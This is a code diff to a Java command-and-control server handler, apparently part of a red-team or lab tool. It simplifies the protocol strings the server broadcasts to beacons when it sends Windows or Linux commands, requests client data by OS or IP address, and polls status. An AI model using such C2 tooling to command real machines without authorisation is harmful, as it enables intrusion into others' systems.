@@ -484,16 +484,16 @@ public class C2ServerUserHandler implements Runnable{
                     // Send commands based on os/scope
                     if(target.equals("all")){
                         if(os.equals("windows") || os.equals("all")){
-                            C2server.broadcastToBeacons("Command Windows All_" + windowsCommands);
+                            C2server.broadcastToBeacons("Command Windows_" + windowsCommands);
                         }
                         if(os.equals("linux") || os.equals("all")){
-                            C2server.broadcastToBeacons("Command Linux All_" + linuxCommands);
+                            C2server.broadcastToBeacons("Command Linux_" + linuxCommands);
                         }
                     } else {
                         if(os.equals("windows")){
-                            C2server.broadcastToBeacons("Command Windows " + target + "_" + windowsCommands);
+                            C2server.broadcastToBeacons("Command " + target + "_" + windowsCommands);
                         } else {
-                            C2server.broadcastToBeacons("Command Linux " + target + "_" + linuxCommands);
+                            C2server.broadcastToBeacons("Command " + target + "_" + linuxCommands);
                         }
                     }
                 }
@@ -512,7 +512,7 @@ public class C2ServerUserHandler implements Runnable{
                 // Request from all Windows Boxes
                 if(userInput.equals("1")){
                     String OS = "Windows";
-                    C2server.broadcastToBeacons("Request ClientData "+ OS +" All_ ");
+                    C2server.broadcastToBeacons("Request " + OS + "_ ");
                     try {
                         waitForResponse();
                     } catch (InterruptedException e) {e.printStackTrace();}
@@ -520,7 +520,7 @@ public class C2ServerUserHandler implements Runnable{
                 // Request from all Linux Boxes
                 } else if (userInput.equals("2")){
                     String OS = "Linux";
-                    C2server.broadcastToBeacons("Request ClientData "+ OS +" All_ ");
+                    C2server.broadcastToBeacons("Request " + OS + "_ ");
                     try {
                         waitForResponse();
                     } catch (InterruptedException e) {e.printStackTrace();}
@@ -530,8 +530,7 @@ public class C2ServerUserHandler implements Runnable{
                     // Ask user for IP
                     System.out.print("Enter IP Address for desired request >> ");
                     String IPAddress = userInputScanner.nextLine();
-                    C2server.broadcastToBeacons("Request ClientData Windows " + IPAddress + "_ ");
-                    C2server.broadcastToBeacons("Request ClientData Linux " + IPAddress + "_ ");
+                    C2server.broadcastToBeacons("Request " + IPAddress + "_ ");
                     try {
                         waitForResponse();
                     } catch (InterruptedException e) {e.printStackTrace();}
@@ -545,7 +544,7 @@ public class C2ServerUserHandler implements Runnable{
 
             // Get Client Status Data
             } else if(currentUserPath.equals("Status")){
-                C2server.broadcastToBeacons("Status ClientStatus All All_ ");
+                C2server.broadcastToBeacons("Status All_ ");
                 try {
                     waitForResponse();
                 } catch (InterruptedException e) {e.printStackTrace();}
